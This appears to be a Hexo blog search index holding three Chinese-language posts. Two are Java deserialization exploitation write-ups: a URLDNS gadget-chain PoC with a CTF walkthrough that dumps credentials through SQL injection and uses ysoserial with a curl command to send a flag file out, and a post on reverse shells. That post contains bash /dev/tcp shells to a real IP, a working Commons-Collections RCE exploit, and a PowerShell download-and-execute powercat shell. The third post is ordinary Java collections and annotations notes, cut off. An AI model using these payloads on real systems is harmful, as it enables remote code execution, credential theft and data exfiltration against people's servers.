<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UrlDns链</title>
      <link href="/2024/11/11/2024-09-14-UrlDns%E9%93%BE/"/>
      <url>/2024/11/11/2024-09-14-UrlDns%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="链分析："><a href="#链分析：" class="headerlink" title="链分析："></a>链分析：</h2><p>给出的利用链：</p><pre class="language-none"><code class="language-none">*   Gadget Chain:*     HashMap.readObject()*       HashMap.putVal()*         HashMap.hash()*           URL.hashCode()</code></pre><p>URL继承了Serializable接口，所以可以反序列化</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906130431694.png"></p><p>URL中hashCode函数调用handler的hashCode,handler的hashCode根据地址解析请求</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906130636566.png"></p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906130717402.png"></p><p>找一个JDK自带的入口点，就是HashMap,HashMap的readObject方法里面调用了hash方法，hash方法调用了hashCode</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131001165.png"></p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131125602.png"></p><p><code>K key = (K) s.readObject();</code><br>这行代码从输入流 <code>s</code> 中读取一个对象，并将其强制转换为 <code>K</code> 类型的对象。这里的 <code>K</code> 是 <code>HashMap</code> 中的键的类型。</p><p>所以把url给put进去，同名函数调用就可以走到URL的hashCode方法里面</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlDns_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://Dnslog"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"CCTest1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>但在hashMap的put方法里面也调用了hash函数，在反序列化之前就发起了Dns请求</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131644117.png"></p><p>URL中当hashCode&#x3D;-1时才会触发handler的hashCode，hashCode初始化就是-1</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131747810.png"></p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906131930314.png"></p><p>所以在调用反射，在put前将其修改不为-1，put后修改回-1。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://ensix8.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Field</span> hashCodefield <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hashCodefield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//随便改一个值</span>    hashCodefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//put后改回-1</span>    hashCodefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//unserialize("CCTest1.ser");</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"CCTest1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="利用：-网鼎杯-2020-朱雀组-Think-Java例子"><a href="#利用：-网鼎杯-2020-朱雀组-Think-Java例子" class="headerlink" title="利用：[网鼎杯 2020 朱雀组]Think Java例子"></a>利用：[网鼎杯 2020 朱雀组]Think Java例子</h2><p>SqlDict文件拼接SQL语句，存在SQL注入</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906214506699.png"></p><p>路由是&#x2F;common&#x2F;test&#x2F;sqlDict</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906214456321.png"></p><p>网站swagger接口泄露，&#x2F;swagger-ui.html的&#x2F;common&#x2F;test&#x2F;sqlDict接口下SQL注入获取账户密码admin,admin@Rrrr_ctf_asde</p><pre class="language-none"><code class="language-none">myapp#a&#x3D;&#39; union select (select name from user)#myapp#a&#x3D;&#39; union select (select pwd from user)#</code></pre><p>admin登录后得到base64编码字符串</p><pre class="language-none"><code class="language-none">Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu</code></pre><p>rO0AB开头，基本确定反序列化文件内容编码</p><p>&#x2F;common&#x2F;user&#x2F;current放入请求返回得到信息</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906215618328.png"></p><p>用之前的UrlDns链生成payload测试，在将内容base64编码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"CCTest1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> byteArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> file<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>byteArray<span class="token punctuation">)</span><span class="token punctuation">;</span>        fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> base64Encoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>byteArray<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Base64 Encoded Payload: "</span> <span class="token operator">+</span> base64Encoded<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>反序列化的字符串也是rO0AB开头</p><pre class="language-none"><code class="language-none">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa&#x2F;ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;3QAEDNtN3B2aS5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAB7eA&#x3D;&#x3D;</code></pre><p>发送payload，带上Bearer </p><pre class="language-none"><code class="language-none">Bearer rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa&#x2F;ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;3QAEDNtN3B2aS5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAB7eA&#x3D;&#x3D;</code></pre><p>成功收到请求</p><p><img src="/%5Cimages%5Cposts%5CUrlDns%5Cimage-20240906215339584.png"></p><p>后面用ysoserial生成payload,再加密直接把flag外带出来就行</p><pre class="language-cmd" data-language="cmd"><code class="language-cmd">java -jar ysoserial-all.jar ROME &quot;curl http:&#x2F;&#x2F;ip:port -d @&#x2F;flag&quot; &gt; 1.ser</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Runtime命令执行和反弹shell</title>
      <link href="/2024/11/11/2024-11-09-Runtime%E5%92%8C%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2024/11/11/2024-11-09-Runtime%E5%92%8C%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>Runtime执行命令时，最终都会调用到<code>public Process exec(String[] cmdarray, String[] envp, File dir)</code>，而exec里面经过函数<code>StringTokenizer</code>进行分割，java 默认的分隔符是空格(“”)、制表符(\t)、换行符(\n)、回车符(\r)。所以导致了<code>Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;);</code>不能正常进行反弹shell</p><p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109160625575.png"></p><p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109160738289.png"></p><p>这里的<code>cmdarray</code>就不再是我们传入的命令了，就不能正常反弹shell</p><p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109160459700.png"></p><p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109161024325.png"></p><h2 id="数组传参"><a href="#数组传参" class="headerlink" title="数组传参"></a>数组传参</h2><p>exec支持数组传参，所以正常进行反弹shell可以用数组进行传参</p><pre class="language-dart" data-language="dart"><code class="language-dart"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string-literal"><span class="token string">"bash"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"-c"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"bash -i >&amp; /dev/tcp/ip/post 0>&amp;1"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="字符串传参"><a href="#字符串传参" class="headerlink" title="字符串传参"></a>字符串传参</h2><p>如果不能进行数组传参，可以用IFS代替空格等，例如<code>bash$&#123;IFS&#125;-i&gt;&amp;/dev/tcp/ip/port&lt;&amp;1</code>也可正常弹shell，所以可以用<code>Runtime.getRuntime().exec(&quot;/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/ip/port&lt;&amp;1&quot;);</code>类似于CTF中命令执行的空格过滤</p><p>空格的替换${IFS}，$IFS$9，&lt;&gt;，&lt;等都可以绕过，也可以base64绕过</p><p><code>Runtime.getRuntime().exec(&quot;bash -c &#123;echo,(bash -i &gt;&amp;/dev/tcp/47.116.120.205/5566 0&gt;&amp;1)的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</code>有些漏洞可能有}不能执行命令</p><p>参考：<a href="https://www.jianshu.com/p/ae3922db1f70">https://www.jianshu.com/p/ae3922db1f70</a></p><p>bugku这道题实验<a href="https://ctf.bugku.com/challenges/detail/id/325.html">ez_java_serialize</a></p><p>EXP:</p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.*;import java.util.*;public class EXP &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new org.apache.commons.collections.functors.InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new org.apache.commons.collections.functors.InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;&#x2F;bin&#x2F;bash -c bash&lt;-i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;47.116.120.205&#x2F;5566&lt;&amp;1&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.decorate(map, chainedTransformer);        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(layzMap,1);        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(null);        Class c &#x3D; badAttributeValueExpException.getClass();        Field declaredField &#x3D; c.getDeclaredField(&quot;val&quot;);        declaredField.setAccessible(true);        declaredField.set(badAttributeValueExpException,tiedMapEntry);        serialize(badAttributeValueExpException);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream oos &#x3D; new ObjectOutputStream(byteArrayOutputStream);        oos.writeObject(obj);        oos.close();        byte[] serializedBytes &#x3D; byteArrayOutputStream.toByteArray();        String base64Encoded &#x3D; Base64.getEncoder().encodeToString(serializedBytes);&#x2F;&#x2F;        System.out.println(base64Encoded);        StringBuilder encodedBuilder &#x3D; new StringBuilder();        for (char c : base64Encoded.toCharArray()) &#123;            encodedBuilder.append(&quot;%&quot;).append(Integer.toHexString(c).toUpperCase());        &#125;        String encodedURL &#x3D; encodedBuilder.toString();        System.out.println(encodedURL);    &#125;&#125;</code></pre><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>Windows可以直接弹</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://47.116.120.205:6666/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> powercat <span class="token operator">-</span>c 47<span class="token punctuation">.</span>116<span class="token punctuation">.</span>120<span class="token punctuation">.</span>205 <span class="token operator">-</span>p 5566 <span class="token operator">-</span>e cmd</code></pre><p><a href="https://github.com/besimorhino/powercat">powercat.ps1</a></p><p><img src="/%5Cimages%5Cposts%5CRuntime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E5%8F%8D%E5%BC%B9shell%5Cimage-20241109164539193.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习</title>
      <link href="/2024/11/11/2024-11-8-Java%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/11/2024-11-8-Java%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p><strong>Collection单列集合:每个集合代表一个值，Map双列集合:包含键值对</strong></p><p><strong>Java集合List</strong></p><p>LIst：有序，可重复，有索引</p><p>List接口常用的实现类有：ArrayList、LinkedList、Vector。</p><pre class="language-none"><code class="language-none">ArrayList&lt;String &gt; list &#x3D; new ArrayList&lt;&gt;();list.add(&quot;ad&quot;);String s &#x3D; list.get(0);System.out.println(s);</code></pre><p><strong>Java集合Set</strong></p><p>Set：Set扩展Collection接口,无序集合，不允许存放重复的元素。</p><p>Set接口常用的实现类有：HashSet、LinkedHashSet、TreeSet</p><p><font color="red"><strong>HashSet</strong></font></p><p><code>HashSet</code>是Set集合最常用实现类，是其经典实现。</p><p>HashSet底层数据结构采用哈希表实现，元素无序且唯一，线程不安全，效率高，可以存储null元素，元素的唯一性是靠所存储元素类型是否重写hashCode()和equals()方法来保证的，如果没有重写这两个方法，则无法保证元素的唯一性。</p><p><strong>Java集合Queue</strong></p><p>Queue接口常用的实现类有：PriorityQueue、Deque</p><p><strong>Java集合Map</strong></p><p>List接口常用的实现类有：HashMap、Hashtable、LinkedHashMap、TreeMap。</p><p><font color="red">HashMap</font><br>Map接口基于哈希表的实现，是使用频率最高的用于键值对处理的数据类型。</p><p>它根据键的hashCode值存储数据，大多数情况下可以直接定位到它的值，特点是访问速度快，遍历顺序不确定，线程不安全，最多允许一个key为null，允许多个value为null。</p><p>可以用 Collections的synchronizedMap方法使HashMap具有线程安全的能力，或者使用ConcurrentHashMap类。</p><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h2><p><code>@Override</code>  重写的注解</p><p><code>@Deprecated</code>  用于修辞方法，表示不鼓励使用的元素，通常因为它危险或存在更好的选择</p><p><code>@SuppressWarnings()</code>  需要传参数，镇压错误的注解。<code>@SuppressWarnings(&quot;all&quot;)</code>镇压全部错误</p><p>元注解</p><p><code>@Target</code> 表示注解可以用在哪些地方</p><p><code>@Retention</code>  表示我们的注解在什么地方还有效   RUNTIME表示所有地方都有效</p><p><code>@Documented</code> 表示是否将我们的注解生成在JAVAdoc中</p><p><code>@interface</code>  用来声明一个注解，格式：public @interface 注解名{定义内容}</p><h2 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>     <span class="token annotation punctuation">@MyAnnotation2</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"张三"</span><span class="token punctuation">)</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Test03</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span>     <span class="token annotation punctuation">@MyAnnotation3</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">)</span> <span class="token comment">//todo value可以不写value=</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Test04</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">,</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//ElementType.TYPE 表示可以应用于类、接口、枚举等，ElementType.METHOD 则表示可以应用于方法。</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>   <span class="token comment">//RUNTIME 表示所有地方都有效</span><span class="token annotation punctuation">@interface</span> <span class="token class-name">MyAnnotation2</span><span class="token punctuation">&#123;</span>     <span class="token comment">//todo 注解的参数： 参数类型+参数名();</span>     <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">int</span> <span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">//default是默认值</span>     <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token 